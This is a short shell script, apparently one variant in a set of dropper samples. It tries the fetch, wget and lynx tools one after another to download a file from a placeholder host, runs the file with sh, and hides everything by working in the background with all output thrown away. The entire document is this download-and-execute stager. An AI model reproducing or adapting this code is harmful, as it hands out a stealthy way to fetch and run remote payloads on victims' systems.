#!/bin/sh
# Variant: schemeless host, three-fetcher list, short identifiers.
F="svc"
H="dl-stage.invalid/~op/$F"
TRY="fetch -q -o -,wget -q -O -,lynx --source"
(IFS=","
for c in $TRY; do
  IFS=" "
  $c $H 1> $F
  if [ -f $F ]; then sh $F
    exit
  fi
  rm -f $F
done) 1>/dev/null 2>/dev/null &
